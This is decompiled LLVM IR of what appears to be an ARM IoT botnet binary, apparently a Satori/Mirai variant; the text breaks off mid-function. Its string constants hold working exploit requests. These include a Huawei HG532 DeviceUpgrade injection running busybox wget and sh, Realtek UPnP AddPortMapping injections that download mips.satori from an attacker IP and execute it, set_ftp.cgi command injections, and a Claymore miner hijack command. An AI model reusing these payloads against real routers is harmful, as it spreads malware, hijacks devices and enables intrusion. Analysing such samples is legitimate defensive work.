source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%tms = type { i32, i32, i32, i32 }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.1 = constant i32 -352321502
@global_var_1728c.5 = global i32 0
@global_var_1729c.6 = global i32* @global_var_1728c.5
@global_var_17404.12 = global i32 0
@global_var_8de4.18 = constant i32 -382908432
@global_var_1741c.21 = global i32 0
@global_var_17420.26 = global i32 0
@global_var_dff8.29 = constant i32 1953775231
@global_var_e010.31 = constant i32 1932670822
@global_var_e028.33 = constant i32 1969760375
@global_var_e030.35 = constant i32 1719085162
@global_var_e038.37 = constant i32 2137139298
@global_var_e040.39 = constant i32 1969760375
@global_var_e050.41 = constant i32 1661413473
@global_var_e058.43 = constant i32 1681080118
@global_var_e06c.45 = constant i32 1968137073
@global_var_e078.47 = constant i32 1684824434
@global_var_e084.49 = constant i32 2138204514
@global_var_e094.51 = constant i32 1617257838
@global_var_e0a0.53 = constant i32 1414747976
@global_var_e0b0.55 = constant i32 1969513329
@global_var_e0bc.57 = constant i32 1650882160
@global_var_e0c8.59 = constant i32 1684235877
@global_var_e0e0.61 = constant i32 1684235877
@global_var_e104.63 = constant i32 2000041069
@global_var_e11c.65 = constant i32 808283442
@global_var_e128.67 = constant i32 1632330347
@global_var_e134.69 = constant i32 1684420192
@global_var_e14c.71 = constant i32 1430283854
@global_var_e158.73 = constant i32 1953657897
@global_var_e16c.75 = constant i32 1969760375
@global_var_e17c.77 = constant i32 1953656873
@global_var_e190.79 = constant i32 1953658665
@global_var_e1a4.81 = constant [51 x i8] c"%|cn=%+7%'tmihwu%d%=)5%7'+j%sbho%c%=njbiXubuheshz%\00"
@global_var_e1d8.83 = constant [53 x i8] c"%|cn=%+7%'tmihwu%d%=)5%7'+j%sbho%c%=njbiXub`tsfs6sz%\00"
@global_var_17424.85 = global i32 0
@1 = constant i32 47
@global_var_172a0.90 = global i32 -1
@global_var_17498.92 = global i32 0
@global_var_e5bb.95 = constant [641 x i8] c"\22, realm=\22HuaweiHomeGateway\22, nonce=\2288645cefb1f9ede0e336e3569d75ee30\22, uri=\22/ctrlt/DeviceUpgrade_1\22, response=\223612f843a42db38f48f59d2a3597e19c\22, algorithm=\22MD5\22, qop=\22auth\22, nc=00000001, cnonce=\22248d1a2560100669\22\0D\0A\0D\0A<?xml version=\221.0\22 ?>\0D\0A    <s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22>\0D\0A    <s:Body><u:Upgrade xmlns:u=\22urn:schemas-upnp-org:service:WANPPPConnection:1\22>\0D\0A    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\0D\0A<NewDownloadURL></NewDownloadURL>\0D\0A</u:Upgrade>\0D\0A    </s:Body>\0D\0A    </s:Envelope>\0D\0A\0D\0A\00"
@global_var_e4dc.99 = constant i32 10
@global_var_e2f0.101 = constant [4 x i8] c"arm\00"
@global_var_172a4.104 = global i32 -1
@global_var_e2f4.109 = constant i32 16777216
@global_var_1742c.112 = global i32 0
@global_var_17438.114 = global i32 0
@global_var_17430.116 = global i32 0
@global_var_17434.118 = global i32 0
@global_var_172a8.120 = constant [27 x i8] c"AVPNWGUZLYORESJTHQDFCXBIMK\00"
@global_var_b880.127 = constant i32 -382910448
@global_var_1743c.130 = global i32 0
@global_var_17448.135 = global i32 0
@global_var_e2fc.140 = constant [26 x i8] c"EthDcrMiner64.exe -epool \00"
@global_var_e318.142 = constant [8 x i8] c" -ewal \00"
@global_var_e314.144 = constant i32 32
@global_var_e320.146 = constant [27 x i8] c"-mode 1 -mport 3333 -mpsw \00"
@global_var_e33c.148 = constant [3 x i8] c"%x\00"
@global_var_e340.150 = constant [71 x i8] c"{\22id\22:0,\22jsonrpc\22:\222.0\22,\22method\22:\22miner_file\22,\22params\22:[\22reboot.bat\22,\22\00"
@global_var_e388.152 = constant [5 x i8] c"\22]}\22\00"
@global_var_17444.156 = global i32 0
@global_var_a974.157 = constant i32 95304
@global_var_e390.159 = constant [62 x i8] c"bdoh,*b,%p`bs,ossw=([(6?2)15)6??)??(e(`,*H,(sjw()d%,9,(sjw()a\00"
@global_var_e3d0.161 = constant [32 x i8] c"bdoh,*b,%to,(sjw()d%,99,(sjw()a\00"
@global_var_e3f0.163 = constant [11 x i8] c"to,(sjw()a\00"
@global_var_e3fc.167 = constant [18 x i8] c"GET login.cgi\0D\0A\0D\0A\00"
@global_var_e410.169 = constant [10 x i8] c"loginuser\00"
@global_var_f268.171 = constant [18 x i8] c"\0A\0D=\22 \0A\0D\22/dev/null\00"
@global_var_be30.172 = constant i32 -369096934
@2 = constant i32 59
@global_var_e420.176 = constant [27 x i8] c"GET /set_ftp.cgi?loginuse=\00"
@global_var_e43c.178 = constant [11 x i8] c"&loginpas=\00"
@global_var_e448.180 = constant [88 x i8] c"&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28\00"
@global_var_e4a0.182 = constant [17 x i8] c"%29 HTTP/1.0\0D\0A\0D\0A\00"
@global_var_e4b4.184 = constant [27 x i8] c"GET /ftptest.cgi?loginuse=\00"
@global_var_e4d0.186 = constant [14 x i8] c" HTTP/1.0\0D\0A\0D\0A\00"
@global_var_e4e0.189 = constant [860 x i8] c"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\0D\0AHost: 127.0.0.1:37215\0D\0AUser-Agent: Hello-World\0D\0AContent-Length: 413\0D\0AConnection: keep-alive\0D\0AAccept: */*\0D\0AAccept-Encoding: gzip, deflate\0D\0AAuthorization: Digest username=\22dslf-config\22, realm=\22HuaweiHomeGateway\22, nonce=\2288645cefb1f9ede0e336e3569d75ee30\22, uri=\22/ctrlt/DeviceUpgrade_1\22, response=\223612f843a42db38f48f59d2a3597e19c\22, algorithm=\22MD5\22, qop=\22auth\22, nc=00000001, cnonce=\22248d1a2560100669\22\0D\0A\0D\0A<?xml version=\221.0\22 ?>\0D\0A    <s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22>\0D\0A    <s:Body><u:Upgrade xmlns:u=\22urn:schemas-upnp-org:service:WANPPPConnection:1\22>\0D\0A    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\0D\0A<NewDownloadURL></NewDownloadURL>\0D\0A</u:Upgrade>\0D\0A    </s:Body>\0D\0A    </s:Envelope>\0D\0A\0D\0A\00"
@global_var_e83c.191 = constant [3 x i8] c"\0D\0A\00"
@global_var_e840.193 = constant [14 x i8] c"\22error\22: null\00"
@global_var_e850.195 = constant [852 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 620\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_eba4.197 = constant [880 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 642\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_ef14.199 = constant [852 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 620\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_1744c.201 = global i32 0
@global_var_cdec.209 = constant i32 -476053504
@global_var_bbd0.213 = constant i32 -443219956
@global_var_bd3c.218 = constant i32 -376111092
@global_var_1748c.221 = global i32 0
@global_var_bebc.223 = constant i32 -456978431
@global_var_1749c.225 = global i32 0
@global_var_17454.227 = global i32 0
@global_var_173c0.230 = global i32 256
@global_var_172c4.231 = global i32* @global_var_173c0.230
@global_var_1747c.234 = global i32 0
@global_var_1751c.236 = global i32 0
@global_var_d5e4.237 = constant i32 -382910416
@global_var_be40.238 = constant i32 -509595648
@global_var_c424.245 = constant i32 -442564520
@global_var_173cc.247 = global i32 0
@global_var_d63c.249 = constant i32 -481230848
@global_var_1746c.251 = global i32 0
@global_var_d1f0.253 = constant i32 -509587456
@global_var_173e4.256 = global i32 0
@global_var_17470.260 = local_unnamed_addr global i32 0
@global_var_c9e0.264 = constant i32 52308
@global_var_17280.270 = global i32 -1
@global_var_17480.273 = global i32 0
@global_var_17484.275 = local_unnamed_addr global i32 0
@global_var_cdd8.276 = constant i32 -390234096
@global_var_f270.278 = constant [10 x i8] c"/dev/null\00"
@global_var_17488.280 = global i32 0
@global_var_17474.285 = local_unnamed_addr global i32 0
@global_var_17478.287 = global i32 0
@global_var_be20.289 = constant i32 -369096930
@global_var_e4b0.295 = constant i32 0
@global_var_173fc.296 = local_unnamed_addr global i32* @global_var_e4b0.295
@global_var_bdd4.301 = constant i32 -442564608
@global_var_d0a0.303 = constant i32 -335544900
@global_var_d1bc.306 = constant i32 -275775369
@global_var_d9cc.307 = constant i32 -382910352
@global_var_17494.310 = global i32 0
@global_var_17534.312 = global i32 0
@global_var_17538.314 = global i32 0
@global_var_17284.317 = global i32 0
@global_var_17400.3 = external global i8*
@global_var_17428.106 = external global i8*
@global_var_17440.132 = external global i8*
@global_var_17441.133 = local_unnamed_addr global i8 0
@global_var_17450.204 = external global i8*
@global_var_e210.88 = constant [2 x i8] c"/\00"
@global_var_e41c.174 = constant [2 x i8] c";\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @function_8130()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @function_dfa8(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @function_80b0() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_17400.3 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_17400.3 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1729c.6 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_1729c.6 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_1729c.6 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_1729c.6 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_17400.3 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_1729c.6, { 1, 0 }
  uselistorder i8** @global_var_17400.3, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @function_8124(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8124:
  %v0_8124 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8124, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8124
  %v2_8124 = load i32, i32* @ip, align 4
  %v4_8124 = lshr i32 %v2_8124, %arg2
  %v5_8124 = sub i32 32, %arg2
  %v6_8124 = shl i32 %v2_8124, %v5_8124
  %v7_8124 = or i32 %v6_8124, %v4_8124
  %v9_8124 = and i32 %v7_8124, %arg1
  call void @__pseudo_branch(i32 %v9_8124)
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8124, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8130() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* inttoptr (i32 94864 to i32*), align 16
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 94864

bb2:                                              ; preds = %.thread
  ret i32 94864

; uselistorder directives
  uselistorder i32 94864, { 1, 0, 2 }
}

define i32 @function_8188() local_unnamed_addr {
dec_label_pc_8188:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @function_ce8c(i32 ptrtoint (i32* @global_var_8de4.18 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 57316, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @function_c650()
  ret i32 %v0_81bc
}

define i32 @function_81cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_81cc:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v2_81d4 = load i32, i32* @global_var_1741c.21, align 4
  store i32 %v2_81d4, i32* %ip.global-to-local, align 4
  %v1_81d8 = urem i32 %arg1, 256
  store i32 %v1_81d8, i32* %r0.global-to-local, align 4
  %v2_82b43 = icmp eq i32 %v2_81d4, 0
  br i1 %v2_82b43, label %dec_label_pc_82bc, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %dec_label_pc_81cc, %dec_label_pc_82b0
  %v0_82b0 = phi i32 [ %v3_82b0, %dec_label_pc_82b0 ], [ %v2_81d4, %dec_label_pc_81cc ]
  %v1_81e0 = inttoptr i32 %v0_82b0 to i32*
  %v2_81e0 = load i32, i32* %v1_81e0, align 4
  %tmp14 = icmp sgt i32 %v2_81e0, 0
  %v9_81ec = icmp eq i32 %v1_81d8, %v2_81e0
  %or.cond = and i1 %tmp14, %v9_81ec
  br i1 %or.cond, label %dec_label_pc_81f4, label %dec_label_pc_82b0

dec_label_pc_81f4:                                ; preds = %dec_label_pc_81e0
  %v1_81f4 = add i32 %v0_82b0, 10
  %v2_81f4 = inttoptr i32 %v1_81f4 to i8*
  %v3_81f4 = load i8, i8* %v2_81f4, align 1
  %v2_81f8 = icmp eq i8 %v3_81f4, 0
  br i1 %v2_81f8, label %.thread, label %dec_label_pc_8254.preheader

dec_label_pc_8254.preheader:                      ; preds = %dec_label_pc_81f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8254

.thread:                                          ; preds = %dec_label_pc_81f4
  ret i32 %v1_81d8

dec_label_pc_8208:                                ; preds = %dec_label_pc_8254
  %v1_8208 = add i32 %v0_8208, 4
  %v2_8208 = inttoptr i32 %v1_8208 to i32*
  %v3_8208 = load i32, i32* %v2_8208, align 4
  store i32 %v3_8208, i32* %r1.global-to-local, align 4
  %v2_820c = add i32 %v3_8208, %v2_8218
  %v3_820c = inttoptr i32 %v2_820c to i8*
  %v4_820c = load i8, i8* %v3_820c, align 1
  %v2_8214 = xor i8 %v4_820c, -19
  store i8 %v2_8214, i8* %v3_820c, align 1
  %v0_821c = load i32, i32* %ip.global-to-local, align 4
  %v1_821c = add i32 %v0_821c, 4
  %v2_821c = inttoptr i32 %v1_821c to i32*
  %v3_821c = load i32, i32* %v2_821c, align 4
  store i32 %v3_821c, i32* %r1.global-to-local, align 4
  %v0_8220 = load i32, i32* %r0.global-to-local, align 4
  %v2_8220 = add i32 %v0_8220, %v3_821c
  %v3_8220 = inttoptr i32 %v2_8220 to i8*
  %v4_8220 = load i8, i8* %v3_8220, align 1
  %v2_8228 = xor i8 %v4_8220, -22
  store i8 %v2_8228, i8* %v3_8220, align 1
  %v0_8230 = load i32, i32* %ip.global-to-local, align 4
  %v1_8230 = add i32 %v0_8230, 4
  %v2_8230 = inttoptr i32 %v1_8230 to i32*
  %v3_8230 = load i32, i32* %v2_8230, align 4
  %v0_8234 = load i32, i32* %r0.global-to-local, align 4
  %v2_8234 = add i32 %v0_8234, %v3_8230
  %v3_8234 = inttoptr i32 %v2_8234 to i8*
  %v4_8234 = load i8, i8* %v3_8234, align 1
  %v6_8234 = zext i8 %v4_8234 to i32
  %v1_8238 = load i32, i32* @lr, align 4
  %v2_8238 = xor i32 %v1_8238, %v6_8234
  %v1_823c = trunc i32 %v2_8238 to i8
  store i8 %v1_823c, i8* %v3_8234, align 1
  %v0_8240 = load i32, i32* %ip.global-to-local, align 4
  %v1_8240 = add i32 %v0_8240, 4
  %v2_8240 = inttoptr i32 %v1_8240 to i32*
  %v3_8240 = load i32, i32* %v2_8240, align 4
  %v0_8244 = load i32, i32* %r0.global-to-local, align 4
  %v2_8244 = add i32 %v0_8244, %v3_8240
  %v3_8244 = inttoptr i32 %v2_8244 to i8*
  %v4_8244 = load i8, i8* %v3_8244, align 1
  %v6_8244 = zext i8 %v4_8244 to i32
  %v1_8248 = load i32, i32* @lr, align 4
  %v2_8248 = xor i32 %v1_8248, %v6_8244
  %v1_824c = trunc i32 %v2_8248 to i8
  store i8 %v1_824c, i8* %v3_8244, align 1
  %v0_8250 = load i32, i32* %r0.global-to-local, align 4
  %v1_8250 = add i32 %v0_8250, 1
  store i32 %v1_8250, i32* %r0.global-to-local, align 4
  %v0_8254.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_8254

dec_label_pc_8254:                                ; preds = %dec_label_pc_8254.preheader, %dec_label_pc_8208
  %v2_8218 = phi i32 [ 0, %dec_label_pc_8254.preheader ], [ %v1_8250, %dec_label_pc_8208 ]
  %v0_8208 = phi i32 [ %v0_82b0, %dec_label_pc_8254.preheader ], [ %v0_8254.pre, %dec_label_pc_8208 ]
  %v1_8254 = add i32 %v0_8208, 8
  %v2_8254 = inttoptr i32 %v1_8254 to i8*
  %v3_8254 = load i8, i8* %v2_8254, align 1
  %v4_8254 = zext i8 %v3_8254 to i32
  %v1_8258 = add i32 %v0_8208, 9
  %v2_8258 = inttoptr i32 %v1_8258 to i8*
  %v3_8258 = load i8, i8* %v2_8258, align 1
  %v4_8258 = zext i8 %v3_8258 to i32
  %v4_825c = mul nuw nsw i32 %v4_8258, 256
  %v5_825c = or i32 %v4_825c, %v4_8254
  store i32 -34, i32* @lr, align 4
  %v5_8268 = icmp slt i32 %v2_8218, %v5_825c
  br i1 %v5_8268, label %dec_label_pc_8208, label %dec_label_pc_8298

dec_label_pc_8274:                                ; preds = %dec_label_pc_8298
  %v1_8274 = add i32 %v0_8274, 4
  %v2_8274 = inttoptr i32 %v1_8274 to i32*
  %v3_8274 = load i32, i32* %v2_8274, align 4
  %v2_8278 = add i32 %v3_8274, %v2_8284
  %v1_827c = add i32 %v2_8278, 1
  %v2_827c = inttoptr i32 %v1_827c to i8*
  %v3_827c = load i8, i8* %v2_827c, align 1
  %v3_8280 = inttoptr i32 %v2_8278 to i8*
  %v4_8280 = load i8, i8* %v3_8280, align 1
  %v6_8280 = zext i8 %v4_8280 to i32
  store i32 %v6_8280, i32* %r1.global-to-local, align 4
  store i8 %v3_827c, i8* %v3_8280, align 1
  %v0_8288 = load i32, i32* %ip.global-to-local, align 4
  %v1_8288 = add i32 %v0_8288, 4
  %v2_8288 = inttoptr i32 %v1_8288 to i32*
  %v3_8288 = load i32, i32* %v2_8288, align 4
  %v1_828c = load i32, i32* %r0.global-to-local, align 4
  %v2_828c = add i32 %v1_828c, %v3_8288
  %v0_8290 = load i32, i32* %r1.global-to-local, align 4
  %v1_8290 = trunc i32 %v0_8290 to i8
  %v3_8290 = add i32 %v2_828c, 1
  %v4_8290 = inttoptr i32 %v3_8290 to i8*
  store i8 %v1_8290, i8* %v4_8290, align 1
  %v0_8294 = load i32, i32* %r0.global-to-local, align 4
  %v1_8294 = add i32 %v0_8294, 2
  %v0_8298.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_8298

dec_label_pc_8298:                                ; preds = %dec_label_pc_8254, %dec_label_pc_8274
  %v0_8274 = phi i32 [ %v0_8298.pre, %dec_label_pc_8274 ], [ %v0_8208, %dec_label_pc_8254 ]
  %v2_8284 = phi i32 [ %v1_8294, %dec_label_pc_8274 ], [ 0, %dec_label_pc_8254 ]
  store i32 %v2_8284, i32* %r0.global-to-local, align 4
  %v1_8298 = add i32 %v0_8274, 8
  %v2_8298 = inttoptr i32 %v1_8298 to i8*
  %v3_8298 = load i8, i8* %v2_8298, align 1
  %v4_8298 = zext i8 %v3_8298 to i32
  %v1_829c = add i32 %v0_8274, 9
  %v2_829c = inttoptr i32 %v1_829c to i8*
  %v3_829c = load i8, i8* %v2_829c, align 1
  %v4_829c = zext i8 %v3_829c to i32
  store i32 %v4_829c, i32* @r2, align 4
  %v4_82a0 = mul nuw nsw i32 %v4_829c, 256
  %v5_82a0 = or i32 %v4_82a0, %v4_8298
  %v5_82a8 = icmp slt i32 %v2_8284, %v5_82a0
  br i1 %v5_82a8, label %dec_label_pc_8274, label %dec_label_pc_82bc

dec_label_pc_82b0:                                ; preds = %dec_label_pc_81e0
  %v1_82b0 = add i32 %v0_82b0, 12
  %v2_82b0 = inttoptr i32 %v1_82b0 to i32*
  %v3_82b0 = load i32, i32* %v2_82b0, align 4
  store i32 %v3_82b0, i32* %ip.global-to-local, align 4
  %v2_82b4 = icmp eq i32 %v3_82b0, 0
  br i1 %v2_82b4, label %dec_label_pc_82b4.dec_label_pc_82bc.loopexit1_crit_edge, label %dec_label_pc_81e0

dec_label_pc_82b4.dec_label_pc_82bc.loopexit1_crit_edge: ; preds = %dec_label_pc_82b0
  br label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %dec_label_pc_8298, %dec_label_pc_81cc, %dec_label_pc_82b4.dec_label_pc_82bc.loopexit1_crit_edge
  %v2_82c0 = phi i32 [ 0, %dec_label_pc_82b4.dec_label_pc_82bc.loopexit1_crit_edge ], [ 0, %dec_label_pc_81cc ], [ %v0_8274, %dec_label_pc_8298 ]
  %v3_82c0 = add i32 %v2_82c0, 10
  %v4_82c0 = inttoptr i32 %v3_82c0 to i8*
  store i8 0, i8* %v4_82c0, align 1
  %v5_82c4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_82c4

; uselistorder directives
  uselistorder i32 %v3_82b0, { 1, 2, 0 }
  uselistorder i32 %v2_8284, { 1, 2, 0 }
  uselistorder i32 %v0_8274, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8208, { 0, 3, 2, 1 }
  uselistorder i32 %v2_8218, { 1, 0 }
  uselistorder i32 %v2_81e0, { 1, 0 }
  uselistorder i32 %v0_82b0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_81d8, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 10, 4, 2, 3, 1, 5, 6, 7, 8, 9, 11, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_82bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8298, { 1, 0 }
  uselistorder label %dec_label_pc_8254, { 1, 0 }
  uselistorder label %dec_label_pc_81e0, { 1, 0 }
}

define i32 @function_82cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_82cc:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v2_82d4 = load i32, i32* @global_var_1741c.21, align 4
  store i32 %v2_82d4, i32* %ip.global-to-local, align 4
  %v1_82d8 = urem i32 %arg1, 256
  store i32 %v1_82d8, i32* %r0.global-to-local, align 4
  %v2_83b83 = icmp eq i32 %v2_82d4, 0
  br i1 %v2_83b83, label %dec_label_pc_83c0, label %dec_label_pc_82e0

dec_label_pc_82e0:                                ; preds = %dec_label_pc_82cc, %dec_label_pc_83b4
